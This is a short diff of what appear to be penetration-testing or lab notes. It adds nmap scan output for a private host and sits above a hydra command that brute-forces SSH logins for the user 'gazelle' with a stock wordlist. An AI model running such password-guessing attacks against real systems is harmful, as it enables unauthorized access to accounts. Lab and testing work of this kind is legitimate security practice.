@@ -1,3 +1,14 @@
+
+Nmap scan report for 10.30.0.250
+Host is up (0.0038s latency).
+Not shown: 1022 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+
+
+
+
 sudo hydra -t 4 -l gazelle -P /usr/share/wordlists/fasttrack.txt 10.30.0.250 ssh 
 
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
